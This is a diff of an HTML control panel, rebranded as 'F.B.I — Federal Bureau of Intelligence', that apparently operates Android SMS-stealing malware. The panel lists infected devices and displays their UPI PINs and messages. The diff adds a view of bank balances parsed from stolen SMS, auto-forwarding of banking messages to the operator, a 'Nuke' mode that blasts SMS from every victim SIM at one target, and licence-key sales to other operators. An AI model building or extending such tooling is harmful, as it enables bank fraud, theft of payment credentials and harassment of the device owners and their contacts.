@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>SPECTER &mdash; Advanced Cyber Panel</title>
+<title>F.B.I &mdash; Federal Bureau of Intelligence</title>
 <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
@@ -16,65 +16,53 @@
   <button class="otp-x" onclick="otpDismiss()">✕</button>
 </div>
 
+<!-- ══════════ LOGIN ══════════ -->
+<div id="loginScreen" style="display:flex">
+  <div class="orb o1"></div><div class="orb o2"></div>
+  <div class="login-card">
+    <img src="https://i.ibb.co/rKj7BZ7C/IMG-20260914-230127-675.jpg" alt="F.B.I" class="brand-logo"/>
+    <div class="login-brand">F.B.I</div>
+    <div class="login-sub">Federal Bureau of Intelligence</div>
+    <div class="login-tagline">Enter your license key to continue</div>
+    <label class="fl">License Key</label>
+    <input id="keyInput" class="fi key-input" placeholder="FBI-XXXX-XXXX-XXXX" autocomplete="off"/>
+    <button class="cta" onclick="rippleClick(event);validateKey()">🔐 Unlock Panel</button>
+    <div class="s-err" id="loginErr">Invalid or expired key</div>
+    <div class="login-info" id="loginInfo"></div>
+    <div class="s-footer"><span class="gold-grad">F.B.I • Cyber Edition</span></div>
+    <div style="font-size:11px;color:var(--dim);margin-top:16px;text-align:center;line-height:1.5;">🔒 Admin-only access. Contact administrator for key.</div>
+  </div>
+</div>
+
 <!-- ══════════ SETUP ══════════ -->
-<div id="setup" style="display:flex">
+<div id="setup" style="display:none">
   <div class="orb o1"></div><div class="orb o2"></div>
   <div class="setup-card">
-    <div class="cat-stage">
-      <div class="cat-sh"></div>
-      <div class="cp" style="left:29%;bottom:54%;background:#a855f7;--dur:1.9s;--del:0s;--dx:-20px;width:5px;height:5px;"></div>
-      <div class="cp" style="left:71%;bottom:60%;background:#e879f9;--dur:2.2s;--del:.35s;--dx:18px;width:4px;height:4px;"></div>
-      <div class="cp" style="left:50%;bottom:72%;background:#c084fc;--dur:1.7s;--del:.7s;--dx:12px;width:3px;height:3px;"></div>
-      <div class="cat-wrap" onclick="catClick()">
-        <svg class="cat-svg" viewBox="0 0 140 140" xmlns="http://www.w3.org/2000/svg">
-          <defs>
-            <radialGradient id="cBod" cx="40%" cy="30%"><stop offset="0%" stop-color="#1a0e30"/><stop offset="100%" stop-color="#08040e"/></radialGradient>
-            <radialGradient id="eyeGL" cx="35%" cy="35%"><stop offset="0%" stop-color="#a855f7"/><stop offset="100%" stop-color="#1a0a2e"/></radialGradient>
-            <radialGradient id="eyeGR" cx="35%" cy="35%"><stop offset="0%" stop-color="#e879f9"/><stop offset="100%" stop-color="#2a0a2a"/></radialGradient>
-            <radialGradient id="hGrad" cx="40%" cy="30%"><stop offset="0%" stop-color="#a855f7"/><stop offset="100%" stop-color="#4c1d95"/></radialGradient>
-            <filter id="glow" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="2.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
-          </defs>
-          <ellipse cx="70" cy="103" rx="30" ry="23" fill="url(#cBod)"/>
-          <path d="M 100,105 Q 128,88 124,68 Q 120,50 132,38" stroke="rgba(168,85,247,0.7)" stroke-width="6" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 105px"/>
-          <path d="M 38,36 L 25,6 L 52,30" fill="url(#hGrad)" filter="url(#glow)"/>
-          <path d="M 102,36 L 115,6 L 88,30" fill="url(#hGrad)" filter="url(#glow)"/>
-          <circle cx="70" cy="60" r="32" fill="url(#cBod)"/>
-          <polygon points="38,38 30,16 52,33" fill="url(#cBod)"/>
-          <polygon points="102,38 110,16 88,33" fill="url(#cBod)"/>
-          <g style="animation:eyeBlink 5s infinite;transform-origin:56px 60px">
-            <ellipse cx="56" cy="60" rx="10" ry="11" fill="url(#eyeGL)" filter="url(#glow)"/>
-            <ellipse cx="56" cy="60" rx="3.5" ry="9" fill="#1a0a2e"/>
-            <circle cx="59" cy="55" r="2.8" fill="rgba(216,180,254,.9)"/>
-          </g>
-          <g style="animation:eyeBlink 5s infinite;animation-delay:.07s;transform-origin:84px 60px">
-            <ellipse cx="84" cy="60" rx="10" ry="11" fill="url(#eyeGR)" filter="url(#glow)"/>
-            <ellipse cx="84" cy="60" rx="3.5" ry="9" fill="#2a0a2a"/>
-            <circle cx="87" cy="55" r="2.8" fill="rgba(232,121,249,.85)"/>
-          </g>
-          <polygon points="70,70 66,75 74,75" fill="rgba(232,121,249,.9)"/>
-          <path d="M 42,84 Q 70,96 98,84" stroke="#a855f7" stroke-width="5.5" fill="none" stroke-linecap="round"/>
-          <circle cx="70" cy="92" r="6" fill="#a855f7" stroke="rgba(232,121,249,.7)" stroke-width="1.8"/>
-        </svg>
-      </div>
-    </div>
-    <div class="setup-eyebrow">SPECTER Advanced Panel</div>
-    <div class="setup-h"><span class="gold-word">Advanced</span> Console</div>
-    <div class="setup-sub">Connect your Firebase database and unlock the SPECTER command center.</div>
+    <img src="https://i.ibb.co/rKj7BZ7C/IMG-20260914-230127-675.jpg" alt="F.B.I" class="brand-logo setup-logo"/>
+    <div class="setup-eyebrow">F.B.I Advanced Panel</div>
+    <div class="setup-h"><span class="gold-word">Connect</span> Database</div>
+    <div class="setup-sub">Enter your Firebase database URL to unlock the command center.</div>
     <label class="fl">Firebase Database URL</label>
     <input id="fbUrl" class="fi" placeholder="https://your-project.firebaseio.com" type="url"/>
     <button type="button" class="cta" onclick="rippleClick(event);connect()">⚡ Connect to Firebase →</button>
-    <div class="s-err" id="serr">Connection failed — check URL and key</div>
-    <div class="s-footer"><span class="gold-grad">SPECTER • Advanced Cyber Edition</span></div>
+    <div class="s-err" id="serr">Connection failed — check URL</div>
+    <div class="s-footer"><span class="gold-grad">F.B.I • Federal Bureau of Intelligence</span></div>
   </div>
 </div>
 
 <!-- ══════════ MAIN PANEL ══════════ -->
 <div id="panel">
   <div class="tb">
-    <div class="tb-dots"><div class="td td-r" onclick="disconnect()" title="Disconnect"></div><div class="td td-y"></div><div class="td td-g"></div></div>
-    <div class="tb-logo"><span class="tb-gl">SPECTER</span></div>
+    <div class="tb-dots"><div class="td td-r" onclick="logout()" title="Logout"></div><div class="td td-y"></div><div class="td td-g"></div></div>
+    <img src="https://i.ibb.co/rKj7BZ7C/IMG-20260914-230127-675.jpg" alt="F.B.I" class="tb-logo-img"/>
+    <div class="tb-logo"><span class="tb-gl">F.B.I</span></div>
     <div class="tb-pills"><span class="pill p-t" id="tpTot">—</span><span class="pill p-on" id="tpOn">—</span><span class="pill p-off" id="tpOff">—</span></div>
     <div class="live-dot"></div>
+
+    <div class="search-wrap">
+      <span class="search-ico">🔍</span>
+      <input id="deviceSearch" placeholder="Search device / number / ID..." oninput="filterDeviceGrid()"/>
+    </div>
 
     <button class="tb-btn" onclick="loadDevs()" title="Refresh">↻</button>
 
@@ -85,10 +73,13 @@
         <div onclick="setGridFilter('online')" data-f="online">🟢 Online Only</div>
         <div onclick="setGridFilter('offline')" data-f="offline">🔴 Offline Only</div>
         <div onclick="setGridFilter('pin')" data-f="pin">💳 Has UPI PIN</div>
+        <div onclick="setGridFilter('balance')" data-f="balance">💰 Has Balance</div>
       </div>
     </div>
 
+    <button class="tb-btn balance-btn" onclick="openBalances()">💰 Balances</button>
     <button class="tb-btn nuke-btn" onclick="openNuke()">💣 Nuke</button>
+    <button class="tb-btn" id="admBtn" onclick="openAdminPanel()" style="color:#ffd700;display:none;">👑 Admin</button>
     <button class="tb-btn" onclick="openSettings()">⚙ Settings</button>
     <button class="tb-btn" onclick="openAllMsgs()">📋 All Msgs</button>
     <button class="tb-btn" id="apBtn" onclick="autoPinAll()" style="color:var(--lilac)">PING</button>
@@ -113,27 +104,20 @@
           <div class="dm-sub" id="dmSub">—</div>
         </div>
       </div>
-      <div class="dm-header-right">
-        <button class="dm-close" onclick="closeM('deviceModal')">✕</button>
-      </div>
+      <div class="dm-header-right"><button class="dm-close" onclick="closeM('deviceModal')">✕</button></div>
     </div>
     <div class="dm-body">
-      <!-- LEFT COLUMN -->
       <div class="dm-left">
         <div class="dm-hero" id="dmHero"></div>
-
         <div class="sec-hdr">🎯 Active SIM for outgoing SMS</div>
         <div class="sim-select" id="dmSimSelect">
           <button class="sim-opt" data-sim="1" onclick="setActiveSim(1)">
-            <div class="sim-opt-lbl">SIM 1</div>
-            <div class="sim-opt-num" id="dmSim1">—</div>
+            <div class="sim-opt-lbl">SIM 1</div><div class="sim-opt-num" id="dmSim1">—</div>
           </button>
           <button class="sim-opt" data-sim="2" onclick="setActiveSim(2)">
-            <div class="sim-opt-lbl">SIM 2</div>
-            <div class="sim-opt-num" id="dmSim2">—</div>
+            <div class="sim-opt-lbl">SIM 2</div><div class="sim-opt-num" id="dmSim2">—</div>
           </button>
         </div>
-
         <div class="sec-hdr">💳 UPI PIN</div>
         <div class="pin-card" id="dmPinCard">
           <div class="pin-digits loading" id="dmPinVal">Loading…</div>
@@ -142,28 +126,20 @@
             <button class="pin-action-btn pin-copy-btn" id="dmPinCopy" onclick="copyPinActive()" style="display:none">Copy</button>
           </div>
         </div>
-
         <div class="sec-hdr">📝 Device Note</div>
         <div class="note-row">
           <input class="note-inp" id="dmNoteInp" placeholder="Add note (bal, owner…)"/>
           <button class="note-save" onclick="saveNoteActive()">Save</button>
         </div>
-
         <div class="sec-hdr">📊 Info</div>
         <div class="info-grid" id="dmInfo"></div>
-
-        <div class="det-actions">
-          <button class="da da-d" onclick="confDelActive()">🗑 Delete Device</button>
-        </div>
+        <div class="det-actions"><button class="da da-d" onclick="confDelActive()">🗑 Delete Device</button></div>
       </div>
-
-      <!-- RIGHT COLUMN -->
       <div class="dm-right">
         <div class="dm-tabs">
           <button class="dm-tab active" data-tab="msgs" onclick="dmSwitchTab('msgs')">💬 Messages</button>
           <button class="dm-tab" data-tab="send" onclick="dmSwitchTab('send')">📡 Send SMS</button>
         </div>
-
         <div class="dm-tab-pane active" id="dmPane-msgs">
           <div class="msg-top">
             <div style="display:flex;align-items:center;gap:10px"><div class="msg-cnt" id="dmMsgCnt">0</div></div>
@@ -174,14 +150,13 @@
             </div>
           </div>
           <div class="msg-bar">
-            <div class="sbox"><input id="dmMsgSearch" placeholder="Search..." oninput="filterActiveMsgs()"/></div>
+            <div class="sbox"><input id="dmMsgSearch" placeholder="Search messages..." oninput="filterActiveMsgs()"/></div>
             <button class="mfb ma" id="dm-mf-all" onclick="setActiveMF('all')">All</button>
             <button class="mfb" id="dm-mf-incoming" onclick="setActiveMF('incoming')">In</button>
             <button class="mfb" id="dm-mf-outgoing" onclick="setActiveMF('outgoing')">Out</button>
           </div>
           <div id="dmMsgList" class="msg-list"></div>
         </div>
-
         <div class="dm-tab-pane" id="dmPane-send">
           <div class="send-box">
             <div class="ddisp" id="dmSendDisp"></div>
@@ -210,6 +185,25 @@
   </div>
 </div>
 
+<!-- ══════════ BALANCES MODAL ══════════ -->
+<div class="overlay" id="balanceModal">
+  <div class="modal modal-balance">
+    <div class="modal-header-hero">
+      <div style="font-size:32px">💰</div>
+      <div style="flex:1">
+        <div class="mt" style="margin-bottom:0">All Device Balances</div>
+        <div style="font-size:11px;color:var(--sub)">Latest bank balance parsed from SMS</div>
+      </div>
+      <button class="dm-close" onclick="closeM('balanceModal')">✕</button>
+    </div>
+    <div class="bal-toolbar">
+      <input id="balSearch" class="fi" placeholder="Filter by bank / account / device..." oninput="renderBalances()"/>
+      <button class="mbtn" onclick="refreshBalances()">↻ Refresh</button>
+    </div>
+    <div id="balanceList" class="bal-list"></div>
+  </div>
+</div>
+
 <!-- ══════════ NUKE MODAL ══════════ -->
 <div class="overlay" id="nukeModal">
   <div class="modal modal-nuke">
@@ -223,11 +217,11 @@
     <label class="fl">Target Number</label>
     <input id="nukeTarget" class="nuke-inp" placeholder="+91 9876543210"/>
     <label class="fl">Message</label>
-    <textarea id="nukeMsg" class="nuke-area" placeholder="Type the message to blast from all SIMs..."></textarea>
+    <textarea id="nukeMsg" class="nuke-area" placeholder="Type the message to blast..."></textarea>
     <div class="nuke-info-box">
       <span id="nukeDeviceCount" style="color:var(--mint);font-weight:800">0</span> devices online ·
-      <span id="nukeSimCount" style="color:var(--gold2);font-weight:800">0</span> SIMs total ·
-      <span id="nukeTotalShots" style="color:var(--lilac);font-weight:800">0</span> messages will be sent
+      <span id="nukeSimCount" style="color:var(--gold2);font-weight:800">0</span> SIMs ·
+      <span id="nukeTotalShots" style="color:var(--lilac);font-weight:800">0</span> messages
     </div>
     <div class="nuke-stat-row" id="nukeStats">
       <div class="nuke-stat"><div class="nuke-stat-l">Sent</div><div class="nuke-stat-v" id="nukeSent" style="color:var(--mint)">0</div></div>
@@ -242,21 +236,11 @@
       <button id="nukeFireBtn" class="nuke-fire-btn" onclick="fireNuke()">💣 Fire Nuke</button>
       <button id="nukeStopBtn" class="nuke-stop-btn" onclick="stopNuke()" style="display:none">⏹ Stop</button>
     </div>
-    <div class="mbtns" style="margin-top:14px">
-      <button class="mcnc" onclick="closeM('nukeModal')">Close</button>
-    </div>
+    <div class="mbtns" style="margin-top:14px"><button class="mcnc" onclick="closeM('nukeModal')">Close</button></div>
   </div>
 </div>
 
-
-
-
-
-
-
-
-
-<!-- ══════════ SETTINGS MODAL (updated) ══════════ -->
+<!-- ══════════ SETTINGS MODAL ══════════ -->
 <div class="overlay" id="settingsModal">
   <div class="modal modal-settings">
     <div class="modal-header-hero">
@@ -267,64 +251,58 @@
       </div>
       <button class="dm-close" onclick="closeM('settingsModal')">✕</button>
     </div>
-
     <div class="settings-scroll">
-      <!-- MY NUMBER -->
+      <div class="settings-section" id="adminSection" style="display:none">
+        <div class="settings-title">👑 Admin — License Keys</div>
+        <div class="settings-desc">Generate & manage user keys. One key = one device.</div>
+        <div class="admin-key-form">
+          <input class="fi" id="adminKeyDays" type="number" value="30" placeholder="Days" style="margin-bottom:8px"/>
+          <input class="fi" id="adminKeyCount" type="number" value="1" placeholder="How many keys" style="margin-bottom:8px"/>
+          <button class="mok" onclick="adminGenerateKeys()">🔑 Generate Keys</button>
+        </div>
+        <div id="adminKeyList" class="admin-key-list"></div>
+      </div>
+
       <div class="settings-section">
         <div class="settings-title">📞 My Number (Forward Target)</div>
         <div class="settings-desc">All incoming messages on the active device will be forwarded to this number via SMS.</div>
         <input class="fi" id="setMyNumber" placeholder="+91 9876543210"/>
       </div>
 
-      <!-- TELEGRAM -->
       <div class="settings-section">
         <div class="settings-title">🤖 Telegram Bot</div>
-        <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your Telegram channel as admin. Every message containing a number will trigger an SMS via the active device.</div>
-
-        <label class="fl">Your Telegram User ID (owner)</label>
+        <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your channel as admin.</div>
+        <label class="fl">Your Telegram User ID</label>
         <input class="fi" id="setTgUserId" placeholder="e.g. 123456789"/>
-
         <label class="fl">Channel ID</label>
         <input class="fi" id="setTgChannel" placeholder="-1001234567890 or @channelname"/>
-
-        <div class="settings-toggle-row">
-          <input type="checkbox" id="setTgEnabled"/>
-          <label for="setTgEnabled">Enable Telegram Bot</label>
-        </div>
-        <div class="settings-toggle-row">
-          <input type="checkbox" id="setFwdEnabled"/>
-          <label for="setFwdEnabled">Auto-forward device messages to My Number</label>
-        </div>
+        <div class="settings-toggle-row"><input type="checkbox" id="setTgEnabled"/><label for="setTgEnabled">Enable Telegram Bot</label></div>
+        <div class="settings-toggle-row"><input type="checkbox" id="setFwdEnabled"/><label for="setFwdEnabled">Auto-forward device messages</label></div>
         <div class="settings-status" id="tgStatusLine">Not running</div>
       </div>
 
+      <div class="settings-section">
+        <div class="settings-title">📤 Forward Mode</div>
+        <div style="display:flex;gap:8px;width:100%;margin-top:8px">
+          <button id="setFwdModeAll" onclick="setForwardMode('all')" class="mode-btn">🌐 All Messages</button>
+          <button id="setFwdModeBank" onclick="setForwardMode('banking')" class="mode-btn">🏦 Banking Only</button>
+        </div>
+        <div style="font-size:10px;color:var(--dim);line-height:1.4;margin-top:6px" id="fwdModeHint">All incoming messages will be forwarded</div>
+      </div>
 
-<div class="settings-toggle-row" style="flex-direction:column;align-items:flex-start;gap:8px">
-  <label style="font-size:12px;font-weight:700;color:var(--text)">Forward Mode</label>
-  <div style="display:flex;gap:8px;width:100%">
-    <button id="setFwdModeAll" onclick="setForwardMode('all')" style="flex:1;padding:8px;border-radius:8px;font-family:'Chakra Petch',sans-serif;font-size:11px;font-weight:700;cursor:pointer;border:1px solid var(--border);background:var(--bg3);color:var(--sub)">🌐 All Messages</button>
-    <button id="setFwdModeBank" onclick="setForwardMode('banking')" style="flex:1;padding:8px;border-radius:8px;font-family:'Chakra Petch',sans-serif;font-size:11px;font-weight:700;cursor:pointer;border:1px solid var(--border);background:var(--bg3);color:var(--sub)">🏦 Banking Only</button>
-  </div>
-  <div style="font-size:10px;color:var(--dim);line-height:1.4" id="fwdModeHint">All incoming messages will be forwarded</div>
-</div>
-
-
-      <!-- FIREBASE -->
       <div class="settings-section">
         <div class="settings-title">🔥 Additional Firebase URLs</div>
-        <div class="settings-desc">Devices from all Firebase databases are merged. Config saved to cloud automatically.</div>
         <div id="settingsFbList"></div>
         <div class="fb-add-row">
-          <input class="fi" id="setFbLabel" placeholder="Label (optional)" style="margin-bottom:0"/>
+          <input class="fi" id="setFbLabel" placeholder="Label" style="margin-bottom:0"/>
           <input class="fi" id="setFbUrl" placeholder="https://xxx.firebaseio.com" style="margin-bottom:0"/>
-          <input class="fi" id="setFbKey" placeholder="Auth key (optional)" style="margin-bottom:0"/>
+          <input class="fi" id="setFbKey" placeholder="Auth key" style="margin-bottom:0"/>
           <button class="mok" onclick="addFirebaseFromSettings()">＋ Add</button>
         </div>
       </div>
 
       <div class="settings-section">
         <div class="settings-title">☁️ Cloud Config</div>
-        <div class="settings-desc">Your settings are auto-saved to a cloud JSON blob and restored on any browser.</div>
         <div style="display:flex;gap:8px;margin-top:8px">
           <button class="mcnc" onclick="resetCloudConfig()" style="flex:1">🗑 Reset</button>
           <button class="mok" onclick="forceCloudSave()" style="flex:1">☁ Force Save</button>
@@ -332,10 +310,55 @@
         <div class="settings-status" id="cloudStatus">—</div>
       </div>
     </div>
-
     <div class="mbtns" style="margin-top:16px">
       <button class="mcnc" onclick="closeM('settingsModal')">Close</button>
       <button class="mok" onclick="saveAllSettings()">💾 Save Settings</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════ ADMIN PANEL MODAL ══════════ -->
+<div class="overlay" id="adminModal">
+  <div class="modal modal-settings" style="max-width:720px;">
+    <div class="modal-header-hero">
+      <div style="font-size:36px">👑</div>
+      <div style="flex:1">
+        <div class="mt" style="margin-bottom:0">Admin Panel</div>
+        <div style="font-size:12px;color:var(--sub)">User management · Keys · Subscriptions</div>
+      </div>
+      <button class="dm-close" onclick="closeM('adminModal')">✕</button>
+    </div>
+
+    <div class="admin-stats-grid">
+      <div class="admin-stat-box"><div class="admin-stat-val" id="admTotalUsers">0</div><div class="admin-stat-lbl">Total Keys</div></div>
+      <div class="admin-stat-box"><div class="admin-stat-val" id="admActiveUsers" style="color:var(--mint)">0</div><div class="admin-stat-lbl">Active</div></div>
+      <div class="admin-stat-box"><div class="admin-stat-val" id="admExpiredUsers" style="color:var(--rose)">0</div><div class="admin-stat-lbl">Expired</div></div>
+    </div>
+
+    <div class="settings-section">
+      <div class="settings-title">🔑 Generate New Key</div>
+      <div class="admin-key-form">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px;">
+          <input class="fi" id="admKeyDays" type="number" value="30" placeholder="Days" style="margin-bottom:0"/>
+          <input class="fi" id="admKeyCount" type="number" value="1" placeholder="Qty" style="margin-bottom:0"/>
+        </div>
+        <input class="fi" id="admKeyNote" placeholder="Note (user name, purpose...)" style="margin-bottom:8px"/>
+        <button class="mok" onclick="admGenerateKeys()" style="width:100%;">🔑 Generate Keys</button>
+      </div>
+    </div>
+
+    <div class="settings-section" style="flex:1;overflow:visible;">
+      <div class="settings-title">👥 All Users</div>
+      <div class="admin-search-row">
+        <input class="fi" id="admSearch" placeholder="Search key, note..." oninput="admRenderUsers()" style="margin-bottom:0;flex:1;"/>
+        <button class="mbtn" onclick="admLoadUsers()">↻</button>
+      </div>
+      <div id="admUserList" class="admin-key-list" style="max-height:40vh;"></div>
+    </div>
+
+    <div class="mbtns" style="margin-top:16px;">
+      <button class="mcnc" onclick="closeM('adminModal')">Close</button>
+      <button class="mok" onclick="admSaveUsers()">💾 Save to Cloud</button>
     </div>
   </div>
 </div>
@@ -349,7 +372,7 @@
       <button class="dm-close" onclick="closeM('allMsgsModal')">✕</button>
     </div>
     <div class="msg-bar" style="margin-top:12px">
-      <div class="sbox"><input id="amSearch" placeholder="Search all messages..." oninput="filterAndRender()"/></div>
+      <div class="sbox"><input id="amSearch" placeholder="Search across all devices..." oninput="filterAndRender()"/></div>
       <button class="mfb ma" id="amf-all" onclick="setAMF('all')">All</button>
       <button class="mfb" id="amf-incoming" onclick="setAMF('incoming')">In</button>
       <button class="mfb" id="amf-outgoing" onclick="setAMF('outgoing')">Out</button>
@@ -361,7 +384,6 @@
   </div>
 </div>
 
-<!-- ══════════ ADD/UPDATE/CONFIRM/DELETE MODALS ══════════ -->
 <div class="overlay" id="confirmModal"><div class="modal"><div class="mt" id="confT">Confirm</div><p id="confM" style="color:var(--sub);font-size:13px;margin-bottom:18px;line-height:1.7"></p><div class="mbtns"><button class="mcnc" onclick="closeM('confirmModal')">Cancel</button><button class="mok danger" id="confOk">Delete</button></div></div></div>
 <div class="overlay" id="delMsgModal"><div class="modal" style="max-width:360px">
 <div class="mt" style="color:var(--rose)">🗑 Delete Message?</div>
